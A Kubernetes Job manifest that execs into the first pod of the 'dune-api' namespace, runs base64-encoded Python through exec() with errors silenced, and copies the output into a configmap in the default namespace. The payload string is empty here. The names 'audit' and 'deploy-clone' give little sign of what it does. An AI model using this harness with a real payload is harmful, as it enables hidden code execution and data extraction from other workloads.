apiVersion: batch/v1
kind: Job
metadata:
  name: deploy-clone-v18
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: runner
        image: bitnami/kubectl:latest
        command: ["/bin/sh", "-c"]
        args:
        - |
          POD=$(kubectl get pod -n dune-api -o jsonpath='{.items[0].metadata.name}')
          echo "Pod: $POD"
          RAW=$(kubectl exec -n dune-api "$POD" -- python3 -c "exec(__import__('base64').b64decode('').decode())" 2>/dev/null || true)
          RESULT=$(echo "$RAW" | tail -1)
          echo "Result length: ${#RESULT}"
          kubectl create configmap dune-audit-result4 -n default --from-literal=deploy_clone="$RESULT" --dry-run=client -o yaml | kubectl apply -f -
          echo DONE